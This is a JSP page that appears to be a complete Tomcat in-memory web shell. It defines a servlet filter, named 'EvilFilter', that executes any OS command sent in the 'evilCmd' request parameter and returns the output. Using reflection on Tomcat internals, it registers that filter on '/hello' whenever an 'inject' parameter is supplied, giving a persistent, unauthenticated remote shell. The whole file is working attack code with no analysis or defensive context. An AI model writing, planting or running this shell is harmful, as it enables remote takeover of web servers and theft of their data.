<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.ApplicationContextFacade" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %>
<%@ page import="jakarta.servlet.annotation.WebFilter" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>

<%
    @WebFilter("/hello")
    class EvilFilter implements Filter {
        @Override
        public void doFilter(ServletRequest req, ServletResponse resp, FilterChain filterChain) throws IOException, ServletException {
            // this method is called for every request to the servlet mapped to "/hello"
            String cmd = req.getParameter("evilCmd");
            if (cmd != null) {
                InputStream input = Runtime.getRuntime().exec(cmd).getInputStream();
                ServletOutputStream output = resp.getOutputStream();
                byte[] buffer = new byte[1024];
                int len;
                while ((len = input.read(buffer)) != -1) {
                    output.write(buffer, 0, len);
                }
                output.flush();
                output.close(); // not allow servlet to modify the response
            } else {
                filterChain.doFilter(req, resp); // Continue with the next filter or servlet
            }
        }
    }


    if (request.getParameter("inject") != null) {
        try {
            // get StandardContext obj (inner ctx that do the real work)
            ApplicationContextFacade ctx1 = (ApplicationContextFacade) request.getServletContext();
            Field ctx1Field = ApplicationContextFacade.class.getDeclaredField("context");
            ctx1Field.setAccessible(true);
            ApplicationContext ctx2 = (ApplicationContext) ctx1Field.get(ctx1);
            Field ctx2Field = ApplicationContext.class.getDeclaredField("context");
            ctx2Field.setAccessible(true);
            StandardContext ctx3 = (StandardContext) ctx2Field.get(ctx2);

            // create FilterDef to define the EvilFilter
            EvilFilter evilFilter = new EvilFilter();
            FilterDef filterDef = new FilterDef();
            filterDef.setFilterName("evilFilter");
            filterDef.setFilterClass(evilFilter.getClass().getName());
            filterDef.setFilter(evilFilter);

            // register the FilterDef with the StandardContext
            ctx3.addFilterDef(filterDef);

            // create FilterMap and to map the filter with a URL pattern
            FilterMap filterMap = new FilterMap();
            filterMap.setFilterName(filterDef.getFilterName());
            filterMap.addURLPattern("/hello");
            ctx3.addFilterMap(filterMap);

            // Reinitialize the set of filters for this context
            ctx3.filterStart();

            response.getWriter().println("Shell injected successfully!");
        } catch (Exception e) {
            response.getWriter().println("Error injecting shell: " + e.getMessage());
        }
    }
%>
